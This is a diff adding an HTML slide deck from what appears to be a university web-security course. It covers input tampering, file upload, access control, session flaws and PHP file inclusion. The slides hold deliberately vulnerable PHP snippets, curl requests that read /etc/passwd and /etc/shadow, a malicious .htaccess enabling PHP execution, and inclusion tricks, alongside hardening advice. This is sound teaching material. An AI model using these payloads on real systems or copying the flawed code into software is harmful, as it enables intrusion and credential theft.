@@ -1,0 +1,2606 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="generator" content="pandoc">
+  <meta name="author" content="黄玮">
+  <title>网络安全</title>
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+  <link rel="stylesheet" href="lib/reveal.js/css/reveal.css">
+  <style type="text/css">code{white-space: pre;}</style>
+
+
+    <!-- For syntax highlighting using highlight.js-->
+    <link rel="stylesheet" href="lib/reveal.js/lib/css/zenburn.css">
+
+  <style>
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+  </style>
+  <link rel="stylesheet" href="lib/reveal.js/css/theme/white.css" id="theme">
+  <!-- Printing and PDF exports -->
+<link rel="stylesheet" media="print" href="lib/reveal.js/css/print/pdf.css" />
+  <script>
+    var link = document.createElement( 'link' );
+    link.rel = 'stylesheet';
+    link.type = 'text/css';
+    link.href = window.location.search.match( /print-pdf/gi ) ? 'lib/reveal.js/css/print/pdf.css' : 'lib/reveal.js/css/print/paper.css';
+    document.getElementsByTagName( 'head' )[0].appendChild( link );
+  </script>
+  <!--[if lt IE 9]>
+  <script src="lib/reveal.js/lib/js/html5shiv.js"></script>
+  <![endif]-->
+</head>
+<body>
+  <div class="reveal">
+    <div class="slides">
+
+<section id="title-slide">
+  <h1 class="title">网络安全</h1>
+  <p class="author">黄玮</p>
+</section>
+
+<section>
+<section id="web-attack-defense" class="title-slide slide level1">
+<h1>第七章 Web 应用漏洞攻防</h1>
+
+</section>
+<section id="web-sec-model" class="slide level2">
+<h2>Web 安全模型</h2>
+<p><img data-src="images/chap0x07/web-sec-model.png" /></p>
+</section>
+<section id="web-app-model" class="slide level2">
+<h2>Web 应用模型</h2>
+<table>
+<thead>
+<tr class="header">
+<th></th>
+<th>浏览器(Browser)</th>
+<th>Web 服务器(Server)</th>
+<th>后端服务(Backend)</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>业务</td>
+<td>UI / UE</td>
+<td>CRUD / RESTful</td>
+<td>Search / Cache / DB</td>
+</tr>
+<tr class="even">
+<td>框架</td>
+<td>Vue.js</td>
+<td>Laravel / Struts2</td>
+<td>-</td>
+</tr>
+<tr class="odd">
+<td>语言</td>
+<td>js / html / css</td>
+<td>PHP / Java / Python / Ruby</td>
+<td>SQL / DSL</td>
+</tr>
+<tr class="even">
+<td>运行环境</td>
+<td>Chrome / Firefox</td>
+<td>Nginx / php-fpm / Tomcat</td>
+<td>K8S / ES / MySQL / MongoDB</td>
+</tr>
+<tr class="odd">
+<td>基础设施</td>
+<td>Win / macOS</td>
+<td>Linux</td>
+<td>Linux</td>
+</tr>
+</tbody>
+</table>
+</section>
+<section id="通信协议" class="slide level2">
+<h2>通信协议</h2>
+<ul>
+<li>浏览器 &lt;–&gt; Web 服务器：HTTP</li>
+</ul>
+</section>
+</section>
+<section>
+<section id="review-of-http" class="title-slide slide level1">
+<h1>回顾 HTTP</h1>
+
+</section>
+<section class="slide level2">
+
+<ol type="1">
+<li>浏览器 — HTTP 请求消息 —&gt; 服务器
+<ul>
+<li>服务器 — 请求 —&gt; 后端服务</li>
+<li>服务器 &lt;— 响应 — 后端服务</li>
+</ul></li>
+<li>浏览器 &lt;— HTTP 响应消息 — 服务器</li>
+</ol>
+</section>
+<section class="slide level2">
+
+<p><img data-src="images/chap0x07/firefox-in-kali-debug-mode.png" /></p>
+</section>
+<section id="http-essentials-1" class="slide level2">
+<h2>必知必会基本概念</h2>
+<p><code>HTTP-message   = Request | Response     ; HTTP/1.1 messages</code></p>
+</section>
+<section id="http-essentials-2" class="slide level2">
+<h2>必知必会基本概念</h2>
+<ul>
+<li>请求行
+<ul>
+<li><a href="https://www.ietf.org/rfc/rfc2616.txt"><code>Request-Line   = Method SP Request-URI SP HTTP-Version CRLF</code></a></li>
+</ul></li>
+<li>请求头
+<ul>
+<li>常见请求头</li>
+<li>不同请求头取值的特殊含义</li>
+</ul></li>
+<li>请求体
+<ul>
+<li>二进制文件上传的编码方式</li>
+</ul></li>
+<li>（响应）状态行
+<ul>
+<li><code>Status-Line = HTTP-Version SP Status-Code SP Reason-Phrase CRLF</code></li>
+</ul></li>
+<li>响应头</li>
+<li>响应体</li>
+</ul>
+</section>
+<section id="http-essentials-3" class="slide level2">
+<h2>必知必会基本概念</h2>
+<ul>
+<li>URL 编码</li>
+<li>SQL</li>
+<li>JSON</li>
+<li>…</li>
+</ul>
+</section>
+</section>
+<section>
+<section id="漏洞攻防训练环境搭建" class="title-slide slide level1">
+<h1>漏洞攻防训练环境搭建</h1>
+
+</section>
+<section class="slide level2">
+
+<ul>
+<li>PHP Web 漏洞复现环境</li>
+<li>WebGoat 漏洞复现环境</li>
+</ul>
+</section>
+<section id="千叮咛万嘱咐的注意事项" class="slide level2">
+<h2>千叮咛万嘱咐的注意事项</h2>
+<ol type="1">
+<li>⚠️ 不要在宿主机上直接搭建漏洞复现环境 ⚠️</li>
+<li>⚠️ 请在虚拟机内搭建漏洞复现环境 ⚠️</li>
+<li>⚠️ 且训练入口严格限定在本机虚拟网络范围内 ⚠️</li>
+</ol>
+</section>
+<section id="php-web-sec-lab" class="slide level2">
+<h2>PHP Web 漏洞复现环境</h2>
+<pre class="bash number-lines"><code># （可选步骤）新版 Kali 已在默认安装时禁用 root 用户
+# 允许 root 用户远程 SSH 登录
+# root 用户权限执行以下命令
+sed -i.bak &quot;s/#PermitRootLogin prohibit-password/PermitRootLogin yes/g&quot; /etc/ssh/sshd_config
+
+# 开启 SSH 服务
+systemctl start ssh
+
+# 设置 SSH 服务开机自启动
+systemctl enable ssh
+
+# 检查当前系统中是否已安装 PHP 命令行解释器
+php -v
+
+# 如果输出了 PHP 解释器版本信息，则跳过以下安装步骤
+# 直接跳到「启动 PHP 内置开发版 Web 服务器」
+
+# 安装当前发行版支持的最新版 PHP 命令行解释器
+apt update &amp;&amp; apt install php-cli
+
+# 如果需要安装「旧版本」PHP 解释器，推荐使用 Docker
+# https://hub.docker.com/_/php
+
+# 安装完毕后检查当前安装的 PHP 命令行解释器版本
+php -v
+
+# 启动 PHP 内置开发版 Web 服务器
+# 建议在 tmux 会话中执行该命令
+php -S 0.0.0.0:8080
+
+# 使用浏览器访问虚拟机的任意一个可用网卡上的 IP 地址
+# 端口号设置为 8080
+# 例如 http://127.0.0.1:8080/</code></pre>
+</section>
+<section id="webgoat-lab-setup" class="slide level2">
+<h2>WebGoat 漏洞攻防训练环境</h2>
+<p>访问 <a href="https://github.com/c4pr1c3/ctf-games">https://github.com/c4pr1c3/ctf-games</a> 获得本课程定制的 Web 漏洞攻防训练环境。</p>
+<blockquote>
+<p>或访问国内镜像仓库 <a href="https://gitee.com/c4pr1c3/ctf-games">https://gitee.com/c4pr1c3/ctf-games</a></p>
+</blockquote>
+</section>
+</section>
+<section>
+<section id="输入相关的通用漏洞" class="title-slide slide level1">
+<h1>输入相关的通用漏洞</h1>
+
+</section>
+<section id="一切罪恶都是源于恶意输入数据" class="slide level2">
+<h2>一切罪恶都是源于恶意输入数据</h2>
+<ul>
+<li>不要相信任何来自客户端的提交数据
+<ul>
+<li>客户端的任何数据校验都是纸老虎
+<ul>
+<li>客户端的数据校验机制防君子不防黑客</li>
+</ul></li>
+</ul></li>
+<li>数据和指令/代码必须严格区分
+<ul>
+<li>缓冲区溢出时的机器指令运行在可执行堆栈上</li>
+<li>SQL 注入时执行任意SQL语句</li>
+<li>XSS 时执行任何客户端脚本代码（JS/Flash AS）</li>
+<li>文件上传时上传服务端脚本代码在服务器端执行任意代码</li>
+</ul></li>
+</ul>
+</section>
+</section>
+<section>
+<section id="tainted-user-input" class="title-slide slide level1">
+<h1>1. 未验证的用户输入-示例</h1>
+
+</section>
+<section id="缺陷代码示例" class="slide level2">
+<h2>缺陷代码示例</h2>
+<pre class="php number-lines"><code>&lt;?php
+$file = $_GET[&#39;file&#39;];
+echo file_get_contents($file);</code></pre>
+</section>
+<section id="利用方式示例" class="slide level2">
+<h2>利用方式示例</h2>
+<pre class="bash"><code>curl &quot;http://127.0.0.1:8080/exp-1.php?file=exp-1.php&quot;
+curl &quot;http://127.0.0.1:8080/exp-1.php?file=/etc/passwd&quot;
+curl &quot;http://127.0.0.1:8080/exp-1.php?file=/etc/shadow&quot;</code></pre>
+</section>
+<section id="基本原理" class="slide level2">
+<h2>基本原理</h2>
+<p>攻击者可以篡改 <code>HTTP 请求消息</code> 的任何一个部分</p>
+<ul>
+<li>HTTP 请求行</li>
+<li>HTTP 请求头</li>
+<li>HTTP 请求体</li>
+</ul>
+</section>
+<section id="常见的输入篡改攻击" class="slide level2">
+<h2>常见的输入篡改攻击</h2>
+<ul>
+<li>强制浏览</li>
+<li>命令注入</li>
+<li>跨站点脚本攻击</li>
+<li>缓冲区溢出攻击</li>
+<li>格式化字符串攻击</li>
+<li>SQL 注入</li>
+<li>Cookie 毒化</li>
+<li>隐藏域控制</li>
+</ul>
+</section>
+<section id="输入篡改攻击的成因" class="slide level2">
+<h2>输入篡改攻击的成因</h2>
+<ul>
+<li>只在客户端进行输入验证</li>
+<li>过滤时未进行规范化</li>
+<li>过滤后引入新漏洞</li>
+</ul>
+</section>
+<section id="典型漏洞利用方法" class="slide level2">
+<h2>典型漏洞利用方法</h2>
+<ol type="1">
+<li>拦截 HTTP 请求数据</li>
+<li>修改数据</li>
+<li>继续发送篡改后数据</li>
+</ol>
+</section>
+<section id="典型漏洞利用工具" class="slide level2">
+<h2>典型漏洞利用工具</h2>
+<ul>
+<li>HTTP 协议调试工具</li>
+<li>BurpSuite</li>
+<li>浏览器内置的开发者工具</li>
+</ul>
+</section>
+<section id="prevent-input-weakness-1" class="slide level2">
+<h2>安全加固方案</h2>
+<ul>
+<li>所有的用户输入需要在服务器端进行集中的统一验证
+<ul>
+<li>HTTP 请求行</li>
+<li>HTTP 请求头</li>
+<li>HTTP 请求体</li>
+</ul></li>
+<li>代码复查</li>
+<li>不要“滥用”隐藏域
+<ul>
+<li>存储在 Session 中或从每次请求中获取参数值</li>
+</ul></li>
+</ul>
+</section>
+<section id="prevent-input-weakness-2" class="slide level2">
+<h2>安全加固方案</h2>
+<ul>
+<li>请求参数需要严格的验证其类型
+<ul>
+<li>数据类型（string, integer, real, etc…）</li>
+<li>最小和最大长度</li>
+<li>是否允许 NULL</li>
+<li>参数是否是必需的</li>
+<li>数字的取值范围</li>
+<li>特定模式（正则表达式）
+<ul>
+<li>白名单机制</li>
+</ul></li>
+</ul></li>
+</ul>
+</section>
+<section id="prevent-input-weakness-3" class="slide level2">
+<h2>安全加固方案</h2>
+<ul>
+<li>服务器返回给客户端的重要参数、赋值使用 <code>HMAC</code> 进行参数签名
+<ul>
+<li>千万不要使用 <code>MD5</code>、<code>SHA-XXX</code> 之类的摘要算法对参数进行摘要计算，也不要使用基于“秘密盐值”的 <code>MD5</code>、<code>SHA-XXX</code> 之类的摘要算法对参数进行摘要计算
+<ul>
+<li><a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks">Hash 长度扩展攻击可以用来伪造消息和对应的散列值</a></li>
+</ul></li>
+<li>对客户端提交的请求校验关键逻辑代码中的参数，一旦 <code>消息完整性签名</code> 校验失败，说明客户端尝试篡改请求参数攻击，代码逻辑直接跳过后续业务逻辑代码，给客户端返回统一的错误信息</li>
+</ul></li>
+</ul>
+</section>
+</section>
+<section>
+<section id="bof" class="title-slide slide level1">
+<h1>2. 缓冲区溢出漏洞</h1>
+
+</section>
+<section class="slide level2">
+
+<ul>
+<li>应用程序的缓冲区中存在过量的输入数据，溢出的数据中包含恶意指令且恶意指令被精确填充到可执行堆/栈（内存）中进而导致恶意代码被执行</li>
+<li>一般情况下，Web 应用程序不存在缓冲区溢出漏洞</li>
+</ul>
+</section>
+<section class="slide level2">
+
+<ul>
+<li>Java Web 应用程序不存在缓冲区溢出风险？
+<ul>
+<li>OutOfMemoryError</li>
+<li>CVE-2011-0311</li>
+<li>CVE-2009-1099</li>
+</ul></li>
+</ul>
+</section>
+<section class="slide level2">
+
+<ul>
+<li>PHP Web应用程序不存在缓冲区溢出风险？
+<ul>
+<li>CVE-2011-3268</li>
+<li>CVE-2008-5557</li>
+<li>CVE-2008-2050</li>
+<li>CVE-2007-1399</li>
+<li>CVE-2007-1381</li>
+</ul></li>
+</ul>
+</section>
+<section class="slide level2">
+
+<ul>
+<li>其他语言编写的Web应用程序呢？
+<ul>
+<li>后台应用系统</li>
+<li>本地代码</li>
+</ul></li>
+</ul>
+</section>
+<section class="slide level2">
+
+<p>只要系统中直接或间接存在使用 <code>C/C++</code> 编写的代码，那么该系统就难以彻底摆脱「缓冲区溢出等」<code>内存破坏类</code> 攻击。</p>
+</section>
+<section id="prevention-to-bof" class="slide level2">
+<h2>安全加固方案</h2>
+<ul>
+<li>避免使用本地代码</li>
+<li>避免直接调用本地应用程序</li>
+<li>及时更新应用运行环境
+<ul>
+<li>Java 虚拟机的安全更新补丁</li>
+<li>PHP 语言的安全更新补丁</li>
+</ul></li>
+<li>限制 Web 应用程序的运行权限
+<ul>
+<li>沙盒技术</li>
+</ul></li>
+</ul>
+</section>
+</section>
+<section>
+<section id="file-upload-vul" class="title-slide slide level1">
+<h1>3. 文件上传漏洞</h1>
+
+</section>
+<section class="slide level2">
+
+<ul>
+<li>允许用户上传文件可能会让黑客
+<ul>
+<li>在网页中嵌入恶意代码
+<ul>
+<li>网页木马：控制客户端（网站用户）</li>
+<li>XSS漏洞 / CSRF漏洞 / 构造钓鱼页面…</li>
+</ul></li>
+<li>上传webshell
+<ul>
+<li>控制服务器</li>
+</ul></li>
+</ul></li>
+<li>文件上传漏洞原理</li>
+<li>接下来会通过 PHP 代码实例进行讲解</li>
+</ul>
+</section>
+<section id="推荐训练学习资源" class="slide level2">
+<h2>推荐训练学习资源</h2>
+<ul>
+<li><a href="https://github.com/c0ny1/upload-labs">upload-labs 一个使用 PHP 语言编写的，专门收集渗透测试和 CTF 中遇到的各种上传漏洞的靶场</a></li>
+</ul>
+</section>
+<section id="文件上传漏洞基本原理之利用方式示例" class="slide level2">
+<h2>文件上传漏洞基本原理之利用方式示例</h2>
+<p><img data-src="images/chap0x07/file-upload-rce-1.png" /></p>
+</section>
+<section id="文件上传漏洞基本原理之缺陷代码片段" class="slide level2">
+<h2>文件上传漏洞基本原理之缺陷代码片段</h2>
+<pre class="php"><code>// 摘自 upload-labs 的 Pass-02/index.php
+if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;)) { // BUG 检查用户上传文件的「文件类型」是否在白名单上
+    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; // 获取用户上传文件的临时存储文件路径
+    $img_path = UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; // 获取用户上传文件的原始文件名
+    if (move_uploaded_file($temp_file, $img_path)) { // 按照用户指定的文件名存储文件到服务器上指定目录
+        $is_upload = true;
+    } else {
+        $msg = &#39;上传出错！&#39;;
+    }
+} else {
+    $msg = &#39;文件类型不正确，请重新上传！&#39;;
+}</code></pre>
+</section>
+<section id="php-null-trim-vul" class="slide level2">
+<h2>有意思的 NULL 字符截断问题</h2>
+<ul>
+<li>何为NULL字符
+<ul>
+<li>%00</li>
+<li>ASCII码为0</li>
+</ul></li>
+<li>PHP官方在 <strong>2010 年 12 月 9 日</strong> <code>PHP 5.3.4</code> 版本正式修复了该漏洞
+<ul>
+<li><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2006-7243">CVE-2006-7243</a></li>
+<li><strong>用了4 年时间修补一个漏洞！</strong></li>
+<li>PHP 5.3.4 之前版本仍然受此漏洞影响</li>
+</ul></li>
+<li>不仅仅是 PHP 语言受此漏洞影响！</li>
+</ul>
+</section>
+<section class="slide level2">
+
+<p><a href="https://asciinema.org/a/lz7w9iJHZ5qUyV4a1b8Ac9xU3"><img data-src="https://asciinema.org/a/lz7w9iJHZ5qUyV4a1b8Ac9xU3.svg" alt="asciicast" /></a></p>
+</section>
+<section class="slide level2">
+
+<pre class="php"><code># 自行体验 PHP 5.3.0 环境中的 CVE-2006-7243 漏洞利用过程
+docker run --rm -it c4pr1c3/dve-php:5.3.0 bash</code></pre>
+</section>
+<section id="check-file-type-1" class="slide level2">
+<h2>判断文件类型的安全实践</h2>
+<ul>
+<li>读取<a href="https://www.garykessler.net/library/file_sigs.html">文件头标识</a>
+<ul>
+<li>PNG(8 bytes):89 50 4E 47 0D 0A 1A 0A</li>
+<li>GIF(6 bytes):47 49 46 38 39 61 (GIF89a)</li>
+</ul></li>
+</ul>
+<p><img data-src="images/chap0x07/file-hdr-demo.png" /></p>
+</section>
+<section class="slide level2">
+
+<blockquote>
+<p>文件头标识指纹匹配足够安全吗？</p>
+</blockquote>
+</section>
+<section class="slide level2">
+
+<p><strong>No!</strong></p>
+</section>
+<section class="slide level2">
+
+<ul>
+<li>对于 GIF 图片的有效性判定方法
+<ul>
+<li>补充使用 <code>getimagesize()</code></li>
+<li>限制上传的 <code>GIF</code> 图片分辨率尺寸在合理范围内</li>
+</ul></li>
+</ul>
+</section>
+<section class="slide level2">
+
+<p><img data-src="images/chap0x07/invalid-gif.png" /></p>
+</section>
+<section class="slide level2">
+
+<ul>
+<li>对于其他类型文件
+<ul>
+<li>禁用上传目录的脚本执行权限</li>
+</ul></li>
+</ul>
+<p>以 <code>Apache</code> 为例，可以使用 <code>.htaccess</code></p>
+<pre><code>&lt;Directory /upload&gt;
+Allowoverride All
+&lt;/Directory&gt;
+&lt;Location /upload&gt;
+Options None
+    Options +IncludesNoExec -ExecCGI
+    RemoveHandler .php .phtml .php3 .php4 .php5
+    RemoveType .php .phtml .php3 .php4 .php5
+    php_flag engine off
+    php_admin_flag engine off
+    AddType text/plain .html .htm .shtml .php
+&lt;/Location&gt;</code></pre>
+</section>
+<section id="exploit-htaccess" class="slide level2">
+<h2>.htaccess 防御文件上传漏洞利用的潜在副作用</h2>
+<blockquote>
+<p>攻击者上传精心构造的 <code>.htaccess</code> 来使得「上传目录」下对特定文件类型开启脚本解释执行功能</p>
+</blockquote>
+<pre><code>&lt;Directory /upload&gt;
+Allowoverride All
+&lt;/Directory&gt;
+&lt;Location /upload&gt;
+    Options +IncludesNoExec +ExecCGI
+    php_flag engine on
+    php_admin_flag engine on
+    AddType application/x-httpd-php .php666 # 将 .php666 文件扩展名视为 PHP 代码解释执行
+    php_value zend.multibyte 1  # 开启 PHP 引擎的多字节支持
+    php_value display_errors 1  # 开启 PHP 代码错误信息完全显示
+&lt;/Location&gt;</code></pre>
+</section>
+<section id="继续文件上传漏洞的防御方法探讨" class="slide level2">
+<h2>继续文件上传漏洞的防御方法探讨</h2>
+<ul>
+<li>即使
+<ul>
+<li>检查是否判断了上传文件类型及后缀</li>
+<li>定义上传文件类型白名单</li>
+<li>文件上传目录禁止脚本解析</li>
+</ul></li>
+<li>仍然推荐
+<ul>
+<li>定义文件名白名单</li>
+<li>上传后文件统一重命名</li>
+<li>杜绝 XSS 漏洞 / 文件包含漏洞 / 字符编码漏洞 …</li>
+</ul></li>
+</ul>
+</section>
+</section>
+<section>
+<section id="服务端脚本相关漏洞" class="title-slide slide level1">
+<h1>服务端脚本相关漏洞</h1>
+
+</section>
+<section class="slide level2">
+
+<ul>
+<li>脆弱的访问控制</li>
+<li>认证和会话管理缺陷</li>
+<li>文件包含</li>
+<li>XXE 注入</li>
+<li>反序列化漏洞</li>
+<li>第三方组件缺陷</li>
+</ul>
+</section>
+</section>
+<section>
+<section id="weak-acl" class="title-slide slide level1">
+<h1>4. 脆弱的访问控制</h1>
+
+</section>
+<section id="示例" class="slide level2">
+<h2>示例</h2>
+<ul>
+<li>文档/软件的下载链接地址保护
+<ul>
+<li>http://victim.org/docs/1.doc</li>
+<li>http://victim.org/docs/download.do?id=1</li>
+</ul></li>
+<li>Web应用程序的后台管理入口地址
+<ul>
+<li>http://victim.org/admin</li>
+<li>http://victim.org/console/login</li>
+</ul></li>
+<li>后台操作未执行用户身份认证
+<ul>
+<li>http://victim.org/users/deleteUser.do?userid=001</li>
+<li>http://victim.org/users/addUser.do?userid=001</li>
+</ul></li>
+</ul>
+</section>
+<section id="描述" class="slide level2">
+<h2>描述</h2>
+<ul>
+<li>内容或程序功能未能有效的保护以限制只允许合法用户的访问</li>
+<li>典型案例
+<ul>
+<li><strong>可预测</strong> 的服务器端对象访问唯一标识</li>
+<li>强制浏览（直接在浏览器的地址栏中输入 URL ）</li>
+<li>目录遍历</li>
+<li>文件访问权限</li>
+<li>客户端缓存</li>
+</ul></li>
+</ul>
+</section>
+<section id="可能的漏洞成因" class="slide level2">
+<h2>可能的漏洞成因</h2>
+<ul>
+<li>认证只发生在用户登录时</li>
+<li>仅对 URL 进行鉴权，而不是对完整的请求内容进行鉴权</li>
+<li>未采取集中式的授权管理，而是分散授权管理</li>
+</ul>
+</section>
+<section id="harden-access-control-1" class="slide level2">
+<h2>安全加固方案</h2>
+<ul>
+<li>对每个需要保护的请求进行检查，不仅是在用户第一次登录请求时进行检查</li>
+<li>避免使用自己开发的访问控制，而是使用开发框架内置的或第三方可靠安全访问控制框架
+<ul>
+<li>采用声明式而非硬编码的访问控制</li>
+<li>集中化访问控制而非分散访问控制</li>
+</ul></li>
+</ul>
+</section>
+<section id="harden-access-control-2" class="slide level2">
+<h2>安全加固方案</h2>
+<ul>
+<li>防止客户端缓存重要内容：设置 HTTP 响应头和 <code>HTML meta</code> 标签</li>
+<li>在服务器端使用操作系统提供的访问控制保护文件的未经授权的访问</li>
+<li>业务模型的访问控制授权建模
+<ul>
+<li>访问控制权限划分的三角形基本法则</li>
+</ul></li>
+<li>平行权限访问
+<ul>
+<li>属主权限检查</li>
+</ul></li>
+<li>提升权限访问
+<ul>
+<li>使用 ACL</li>
+</ul></li>
+</ul>
+</section>
+<section class="slide level2">
+
+<h3 id="访问控制的权限三角形模型">访问控制的权限三角形模型</h3>
+<p><img data-src="images/chap0x07/privilege-triangle-model.png" /></p>
+</section>
+<section id="harden-access-control-3" class="slide level2">
+<h2>安全加固方案</h2>
+<table>
+<thead>
+<tr class="header">
+<th>主键 (id)</th>
+<th>主体 (subject)</th>
+<th>客体 (object)</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>1</td>
+<td>Alice</td>
+<td>/srv/www/upload/1.doc</td>
+</tr>
+<tr class="even">
+<td>2</td>
+<td>Bob</td>
+<td>/srv/www/upload/2.doc</td>
+</tr>
+</tbody>
+</table>
+<p>当发生文件访问请求时，可以通过如下的 SQL 语句来检查当前访问是否是授权操作。</p>
+<pre class="sql"><code>-- 只有当查询结果 &gt; 0 时才说明是授权访问，否则均是非授权访问行为
+select count(id) from tb_acl where subject=%user_name% and object=%access_file_path%</code></pre>
+</section>
+</section>
+<section>
+<section id="auth-session-weakness" class="title-slide slide level1">
+<h1>5. 认证和会话管理缺陷</h1>
+
+</section>
+<section id="auth-session-weakness-1" class="slide level2">
+<h2>示例</h2>
+<ul>
+<li>未采用Session cookie，而是在URL中编码已通过认证的用户名和密码</li>
+</ul>
+<blockquote>
+<p>https://host/admin/list.jsp?password=0c6ccf51b817885e&amp;username=11335984ea80882d</p>
+</blockquote>
+<p>上面的这个 URL 很容易被一次 <code>XSS 攻击</code> 截获到</p>
+</section>
+<section id="常见会话管理类缺陷分类" class="slide level2">
+<h2>常见会话管理类缺陷分类</h2>
+<ul>
+<li>会话预测（Session Prediction）</li>
+<li>会话劫持（Session Hijacking）</li>
+<li>会话固定（Session Fixation）</li>
+<li>会话偷渡（Session Riding）</li>
+</ul>
+</section>
+<section class="slide level2">
+
+<p>会话预测（Session Prediction）指的是攻击者可以「预测」出服务端的合法「会话令牌」，从而达成身份冒用的效果。</p>
+</section>
+<section class="slide level2">
+
+<ul>
+<li>会话劫持（Session Hijacking）可以通过中间人劫持攻击或跨站点脚本攻击方式拿到用于会话唯一标识的「会话令牌」</li>
+<li>本节所举的第一个极端简单的脆弱身份认证例子正是这种类型缺陷</li>
+</ul>
+</section>
+<section class="slide level2">
+
+<ul>
+<li>会话固定（Session Fixation）利用到了服务端脚本对于 <strong>身份认证前使用的「会话令牌」在身份认证通过之后没有更换新「会话令牌」</strong> 这个设计模式的缺陷
+<ul>
+<li>攻击者诱骗受害用户使用攻击者提供的「会话令牌」完成身份认证，这样，攻击者手里掌握的这个「会话令牌」也就相应的同步变为「身份认证通过会话令牌」了</li>
+<li>攻击者相当于在并不需要掌握受害用户身份认证凭据的情况下，「克隆」了受害用户的已登录会话</li>
+</ul></li>
+<li>与会话劫持相比，攻击者并不依赖于直接读取到一个已经通过身份认证的「会话令牌」，攻击者初始提供给受害用户的「会话令牌」就是未通过身份认证状态下的</li>
+<li>攻击得手之后，会话固定和会话劫持的效果是一致的：攻击者拿到了受害者用户身份对应的有效会话令牌</li>
+</ul>
+</section>
+<section class="slide level2">
+
+<ul>
+<li>会话偷渡（Session Riding）是 <code>跨站点请求伪造（CSRF）</code> 的另一种表述</li>
+<li>攻击者不需要克隆受害用户的会话，攻击者一次会话偷渡攻击只是借用受害用户保存在客户端的「会话令牌」执行一次受害用户不知情情况下的认证会话操作，攻击者对于受害用户使用的「会话令牌」具体是什么并不知情</li>
+</ul>
+</section>
+</section>
+<section>
+<section id="file-inclusion-vul" class="title-slide slide level1">
+<h1>6. 文件包含</h1>
+
+</section>
+<section id="file-inc-causes" class="slide level2">
+<h2>漏洞成因</h2>
+<ul>
+<li><strong>插件</strong> 功能需要「动态加载执行代码」</li>
+<li>当攻击者可以控制「加载什么代码」的时候，就触发了 <code>文件包含</code> 漏洞</li>
+<li>几乎所有脚本语言都会提供文件包含功能，但 PHP 语言由于其过于灵活和自由的代码执行机制导致了大多数文件包含类漏洞都是出现在 PHP 编写的网站程序之中</li>
+</ul>
+</section>
+<section id="php-file-inc" class="slide level2">
+<h2>PHP 文件包含漏洞</h2>
+<ul>
+<li>include()</li>
+<li>require()</li>
+<li>include_once()</li>
+<li>require_once()</li>
+</ul>
+<blockquote>
+<p>上述四个 PHP 函数都可以传入「变量」来动态加载 PHP 源代码文件</p>
+</blockquote>
+<blockquote>
+<p>既可以是「本地文件」，也可以是「远程文件」</p>
+</blockquote>
+</section>
+<section id="一段缺陷代码示例" class="slide level2">
+<h2>一段缺陷代码示例</h2>
+<pre class="php"><code>&lt;?php
+if (@$_GET[&#39;page&#39;]) {
+    include($_GET[&#39;page&#39;]);
+} else {
+    include &quot;show.php&quot;;
+}</code></pre>
+</section>
+<section class="slide level2">
+
+<blockquote>
+<p>PHP 7.2.6 的默认运行时配置（php.ini）是禁止包含远程文件的，如下图所示是一次失败的远程文件包含漏洞利用行为尝试</p>
+</blockquote>
+<p><img data-src="images/chap0x07/php-include-remote-0.png" /></p>
+</section>
+<section class="slide level2">
+
+<blockquote>
+<p>如下图所示则是修改了 php.ini，设置 <code>allow_url_include=On</code> 之后再次执行得到的成功效果截图</p>
+</blockquote>
+<p><img data-src="images/chap0x07/php-include-remote-1.png" /></p>
+</section>
+<section class="slide level2">
+
+<p>上述例子中被包含的远程文件 <code>remote.php</code> 代码如下：</p>
+<pre class="php"><code>&lt;?php
+phpinfo();</code></pre>
+</section>
+<section class="slide level2">
+
+<p>需要注意的是，除了 <code>allow_url_include=On</code> 远程文件包含漏洞利用的依赖配置之外，还依赖于 <code>allow_url_fopen=On</code></p>
+</section>
+<section id="php-file-inc-read-file" class="slide level2">
+<h2>PHP 本地文件包含读取文件</h2>
+<p><img data-src="images/chap0x07/php-include-local-1.png" /></p>
+</section>
+<section id="php-file-inc-lce" class="slide level2">
+<h2>PHP 本地文件包含执行代码</h2>
+<ul>
+<li>不依赖于修改 PHP 的默认运行时配置即可完成任意 PHP 代码执行</li>
+<li>但相比较于远程文件包含方式，本地文件包含漏洞的利用往往需要配合 <code>文件上传</code> 漏洞利用才能达成目的</li>
+<li>攻击者需要先上传包含 PHP 代码的文件到服务器上，然后还需要知道已上传文件存储在服务器上的路径（绝对路径或相对当前脚本执行环境的相对路径）</li>
+<li>进而通过控制文件包含参数的赋值来加载刚刚上传的恶意文件中的 PHP 代码</li>
+</ul>
+</section>
+<section id="php-file-inc-tips-1" class="slide level2">
+<h2>PHP 文件包含漏洞的利用技巧</h2>
+<ul>
+<li>利用 <code>php://input</code>
+<ul>
+<li><a href="http://php.net/manual/zh/wrappers.php.php#wrappers.php.input">php://input</a> 是个可以访问请求的原始数据的 <strong>只读流</strong></li>
+<li>在使用 POST 方式请求时，HTTP 请求体中的数据会赋值给 HTTP 请求头中对应 GET 变量值为 <code>php://input</code> 的变量</li>
+</ul></li>
+</ul>
+</section>
+<section class="slide level2">
+
+<blockquote>
+<p>如下图所示，使用 curl 构造了一个这样的请求，其中 HTTP 请求体中对应的是一段 PHP 代码：在当前脚本目录下执行操作系统 ls 命令</p>
+</blockquote>
+<p><img data-src="images/chap0x07/php-include-php-input-0.png" /></p>
+</section>
+<section class="slide level2">
+
+<p>注意这种漏洞利用方式，同样依赖于 PHP 的运行时配置 <code>allow_url_include=On</code> ，否则漏洞利用会失败，如下图所示</p>
+<p><img data-src="images/chap0x07/php-include-php-input-1.png" /></p>
